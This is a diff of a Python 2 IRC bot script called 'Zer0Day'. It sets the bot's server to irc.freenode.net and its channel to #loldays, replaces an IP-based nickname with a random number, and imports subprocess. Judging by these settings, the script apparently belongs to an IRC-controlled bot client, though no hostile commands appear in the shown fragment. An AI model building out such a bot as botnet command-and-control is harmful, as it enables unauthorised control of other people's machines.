@@ -1,8 +1,6 @@
-#/usr/bin/env python
+#/usr/bin/env python2
 import socket
-import urllib2
 import subprocess
-import commands
 import urllib
 import sys
 import random
@@ -11,20 +9,14 @@ import platform
 import os
 
 def bot_nick():
-	intf = "eth0"
-	intf_ip = commands.getoutput("ip address show dev " + intf).split()
-	intf_ip = intf_ip[intf_ip.index('inet') + 1].split('/')[0]
-	intf_ip.split(".", 4)
-	oct_1 = intf_ip.split(".", 4)
-	oct_2 = intf_ip.split(".", 4)
-	two_oct = (str(oct_1[2]) + "_"+ str(oct_2[3]))
-	return two_oct 
+    randnum = random.randrange(1,100)
+    return randnum
 	
 # IRC Settings
 x = bot_nick()
-server = "" #Server goes here      
-channel = "#" # Channel to connect to goes here (all channels require a # infront of their name)
-botnick = ("Zer0Day" + x) # The bot's name will be Zer0Day followed by the IP Address of the machine it's calling from.
+server = "irc.freenode.net" #Server goes here      
+channel = "#loldays" # Channel to connect to goes here (all channels require a # infront of their name)
+botnick = ("Zer0Day" + str(x)) # The bot's name will be Zer0Day followed by the IP Address of the machine it's calling from.
 
 def sayHello(text):
         '''
